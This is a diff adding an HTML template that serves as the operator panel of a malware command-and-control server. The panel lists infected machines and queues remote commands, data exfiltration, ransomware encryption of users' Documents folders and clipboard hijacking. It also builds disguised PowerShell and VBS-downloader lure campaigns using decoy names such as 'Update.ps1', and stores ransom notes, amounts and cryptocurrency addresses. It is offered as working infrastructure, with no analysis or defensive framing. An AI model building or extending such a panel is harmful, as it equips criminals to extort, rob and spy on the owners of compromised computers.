@@ -1,0 +1,144 @@
+{% extends 'layout.html' %}
+{% block body %}
+<div class="row g-4">
+  <div class="col-lg-8">
+    <div class="card p-3">
+      <div class="d-flex align-items-center justify-content-between">
+        <h5 class="mb-3">Agents</h5>
+        <a class="btn btn-sm btn-outline-light" href="/raw/agent.py?p={{ request.args.get('p') }}">Download Agent</a>
+      </div>
+      <table class="table table-dark table-striped">
+        <thead><tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>Campaign</th><th>Last Seen</th><th>Actions</th></tr></thead>
+        <tbody>
+          {% for a in agents %}
+          <tr>
+            <td>{{ a['id'] }}</td>
+            <td>{{ a['hostname'] }}</td>
+            <td>{{ a['username'] }}</td>
+            <td>{{ a['os'] }}</td>
+            <td>{{ a['note'] }}</td>
+            <td>{{ a['last_seen'] }}</td>
+            <td>
+              <form class="d-flex gap-2" method="post" action="/admin/queue/{{ a['id'] }}?p={{ request.args.get('p') }}">
+                <select name="type" class="form-select form-select-sm" style="max-width: 160px;">
+                  <option value="exec">exec</option>
+                  <option value="exfil">exfil</option>
+                  <option value="ransom">ransom</option>
+                  <option value="clipjacker">clipjacker</option>
+                </select>
+                <input type="text" name="args" class="form-control form-control-sm" placeholder='{"cmd":"whoami"}' />
+                <button class="btn btn-primary btn-sm" type="submit">Queue</button>
+              </form>
+              <div class="btn-group btn-group-sm mt-2" role="group">
+                <form method="post" action="/admin/queue/{{ a['id'] }}?p={{ request.args.get('p') }}">
+                  <input type=hidden name="type" value="exec" />
+                  <input type=hidden name="args" value='{"cmd":"whoami"}' />
+                  <button class="btn btn-success" type="submit">whoami</button>
+                </form>
+                <form method="post" action="/admin/queue/{{ a['id'] }}?p={{ request.args.get('p') }}">
+                  <input type=hidden name="type" value="clipjacker" />
+                  <input type=hidden name="args" value='{"enable":true}' />
+                  <button class="btn btn-secondary" type="submit">Enable Clip</button>
+                </form>
+                <form method="post" action="/admin/queue/{{ a['id'] }}?p={{ request.args.get('p') }}">
+                  <input type=hidden name="type" value="ransom" />
+                  <input type=hidden name="args" value='{"dirs":["%USERPROFILE%\\Documents"],"ext":".wave"}' />
+                  <button class="btn btn-danger" type="submit">Ransom</button>
+                </form>
+              </div>
+            </td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+    <div class="card p-3 mt-3">
+      <h5 class="mb-3">Recent Tasks</h5>
+      <table class="table table-dark table-striped">
+        <thead><tr><th>ID</th><th>Agent</th><th>Type</th><th>Status</th><th>Updated</th><th>View</th></tr></thead>
+        <tbody>
+          {% for t in tasks %}
+          <tr>
+            <td>{{ t['id'] }}</td>
+            <td>{{ t['agent_id'] }}</td>
+            <td>{{ t['type'] }}</td>
+            <td>{{ t['status'] }}</td>
+            <td>{{ t['updated_at'] }}</td>
+            <td><a class="btn btn-sm btn-outline-light" href="/admin/view/{{ t['id'] }}?p={{ request.args.get('p') }}">Open</a></td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+    <div class="card p-3 mt-3">
+      <h5 class="mb-3">Campaign Builder</h5>
+      <form class="row g-2" method="post" action="/admin/campaigns?p={{ request.args.get('p') }}">
+        <div class="col-md-2"><input name="slug" class="form-control" placeholder="slug (e.g., inv1043)" /></div>
+        <div class="col-md-2"><input name="label" class="form-control" placeholder="label" /></div>
+        <div class="col-md-2">
+          <select name="mode" class="form-select">
+            <option value="ps1">PowerShell script</option>
+            <option value="zip">ZIP (VBS downloader)</option>
+            <option value="raw">Raw text</option>
+          </select>
+        </div>
+        <div class="col-md-3"><input name="filename" class="form-control" placeholder="filename (e.g., Update.ps1)" /></div>
+        <div class="col-md-3"><input name="decoy_url" class="form-control" placeholder="decoy URL (e.g., https://microsoft.com)" /></div>
+        <div class="col-12"><button class="btn btn-primary" type="submit">Create Campaign</button></div>
+      </form>
+      <div class="mt-3">
+        <table class="table table-dark table-striped">
+          <thead><tr><th>Slug</th><th>Label</th><th>Mode</th><th>Filename</th><th>Armed</th><th>Links</th><th>Control</th></tr></thead>
+          <tbody>
+            {% for c in camps %}
+            <tr>
+              <td>{{ c['slug'] }}</td><td>{{ c['label'] }}</td><td>{{ c['mode'] }}</td><td>{{ c['filename'] }}</td>
+              <td>{% if c['armed'] %}<span class="badge bg-danger">armed</span>{% else %}<span class="badge bg-secondary">idle</span>{% endif %}</td>
+              <td>
+                <a class="btn btn-sm btn-outline-light" target="_blank" href="/dl/{{ c['slug'] }}">/dl/{{ c['slug'] }}</a>
+                <a class="btn btn-sm btn-outline-light" target="_blank" href="/ps/{{ c['slug'] }}">/ps/{{ c['slug'] }}</a>
+              </td>
+              <td>
+                <form class="d-inline" method="post" action="/admin/campaigns/arm/{{ c['slug'] }}?p={{ request.args.get('p') }}">
+                  <input type="hidden" name="action" value="arm" />
+                  <button class="btn btn-success btn-sm" type="submit">Arm</button>
+                </form>
+                <form class="d-inline" method="post" action="/admin/campaigns/arm/{{ c['slug'] }}?p={{ request.args.get('p') }}">
+                  <input type="hidden" name="action" value="disarm" />
+                  <button class="btn btn-warning btn-sm" type="submit">Disarm</button>
+                </form>
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="col-lg-4">
+    <div class="card p-3">
+      <h5 class="mb-3">Settings</h5>
+      <form method="post" action="/admin/update_settings">
+        <input type="hidden" name="p" value="{{ request.args.get('p') }}" />
+        <div class="mb-2"><label>BTC Address</label><input class="form-control" name="btc_address" value="{{ settings['btc_address'] }}" /></div>
+        <div class="mb-2"><label>ETH Address</label><input class="form-control" name="eth_address" value="{{ settings['eth_address'] }}" /></div>
+        <div class="mb-2"><label>XMR Address</label><input class="form-control" name="xmr_address" value="{{ settings['xmr_address'] }}" /></div>
+        <div class="mb-2"><label>SOL Address</label><input class="form-control" name="sol_address" value="{{ settings['sol_address'] }}" /></div>
+        <div class="mb-2"><label>TRX Address</label><input class="form-control" name="trx_address" value="{{ settings['trx_address'] }}" /></div>
+        <div class="mb-2"><label>LTC Address</label><input class="form-control" name="ltc_address" value="{{ settings['ltc_address'] }}" /></div>
+        <div class="mb-2"><label>DOGE Address</label><input class="form-control" name="doge_address" value="{{ settings['doge_address'] }}" /></div>
+        <div class="mb-2"><label>XRP Address</label><input class="form-control" name="xrp_address" value="{{ settings['xrp_address'] }}" /></div>
+        <div class="mb-2"><label>XLM Address</label><input class="form-control" name="xlm_address" value="{{ settings['xlm_address'] }}" /></div>
+        <div class="mb-2"><label>ADA Address</label><input class="form-control" name="ada_address" value="{{ settings['ada_address'] }}" /></div>
+        <div class="mb-2"><label>Ransom Ext</label><input class="form-control" name="ransom_extension" value="{{ settings['ransom_extension'] }}" /></div>
+        <div class="mb-2"><label>Ransom Amount (USD)</label><input class="form-control" name="ransom_amount_usd" value="{{ settings['ransom_amount_usd'] }}" /></div>
+        <div class="mb-2"><label>Ransom Note</label><textarea class="form-control" rows="5" name="ransom_note">{{ settings['ransom_note'] }}</textarea></div>
+        <div class="mb-3"><label>Clipboard Hijack</label>
+          <select class="form-select" name="clip_hijack_enable"><option value="true" {% if settings['clip_hijack_enable']=='true' %}selected{% endif %}>enabled</option><option value="false" {% if settings['clip_hijack_enable']=='false' %}selected{% endif %}>disabled</option></select>
+        </div>
+        <button class="btn btn-success" type="submit">Save Settings</button>
+      </form>
+    </div>
+  </div>
+</div>
+{% endblock %}
